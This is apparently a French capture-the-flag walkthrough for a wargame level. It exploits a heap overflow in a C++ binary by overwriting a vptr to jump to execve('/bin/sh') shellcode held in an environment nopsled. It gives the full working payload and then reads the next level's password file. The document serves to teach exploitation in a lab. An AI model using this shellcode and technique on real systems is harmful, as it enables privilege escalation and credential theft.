# Level9 — Commandes

## Connexion

```bash
ssh level9@localhost -p 4242
```

Mot de passe : (dans `level8/flag`)

---

## Recon

```bash
./level9
./level9 coucou
./level9 coucou coucou
# Aucune sortie utile
```

```bash
file level9
c++filt _Znwj
# operator new(unsigned int)
```

Voir `analysis.md` pour le layout (overflow → vptr du second).

---

## GDB — Comprendre main et l’appel virtuel

```bash
gdb -q ./level9
```

```gdb
pdisas main
```

Repérer :
- `main+136` : `mov eax, [esp+0x10]` (eax = second)
- `main+140` : `mov eax, [eax]` (eax = second->vptr)
- `main+142` : `mov edx, [eax]` (edx = *vptr = adresse à appeler)
- `main+159` : `call edx` → appel **(*(second->vptr))(second, first)**

---

## Trouver l’offset de l’overflow

Lancer avec un pattern (ex. script get_offset ou suite connue) :

```bash
(gdb) r 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz'
```

En cas de SIGSEGV à `main+142`, regarder les registres (ex. eax = valeur du pattern) et en déduire l’offset (ex. `bbbb` → **offset 108**).

Vérification pas à pas :

```gdb
break *main+136
run $(python -c 'print "A"*4 + "B"*104 + "CCCC"')
# à main+136 : x/x $eax → adresse du second
si
# main+140 : x/x $eax → 0x42424242 (BBBB) = second->vptr
si
# main+142 : mov edx,[eax] lit à l’offset 108
```

À l’offset **0** (premier+4) on a AAAA ; à l’offset **108** (second->vptr) on place l’adresse à faire exécuter (premier+4).

---

## Solution : shellcode dans l’environnement

- **Offset 0** (premier+4) : adresse du **shellcode** (dans l’env), pas system.
- **Offset 108** (second->vptr) : **premier+4** (0x0804a00c) pour que l’appel fasse `*(premier+4)` = saut vers l’adresse stockée à premier+4 = notre shellcode.

Shellcode execve("/bin/sh") utilisé :

```
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
```

---

## Trouver l’adresse du shellcode (nopsled + shellcode en env)

Utiliser un env minimal pour que l’adresse ne bouge pas trop (sans `export` inutile) :

```bash
env -i payload=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') gdb ./level9
```

```gdb
b main
r
x/200s environ
```

Choisir une adresse dans le nopsled (ex. `0xbffffc63`). Adapter selon la VM.

---

## Construction du payload argv[1]

- 4 octets (offset 0) : **adresse du shellcode** (nopsled) en little-endian.
- 104 octets : padding (ex. `"B"*104`).
- 4 octets (offset 108) : **premier+4** = `\x0c\xa0\x04\x08`.

Exemple (adresse shellcode `0xbffffc63`) :

```bash
python -c 'print "\x63\xfc\xff\xbf" + "B"*104 + "\x0c\xa0\x04\x08"'
```

---

## Exploit final

```bash
env -i payload=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./level9 $(python -c 'print "\x63\xfc\xff\xbf" + "B"*104 + "\x0c\xa0\x04\x08"')
whoami
# bonus0
```

---

## Récupération du flag

```bash
cat /home/user/bonus0/.pass
```

Noter le mot de passe dans `level9/flag`.
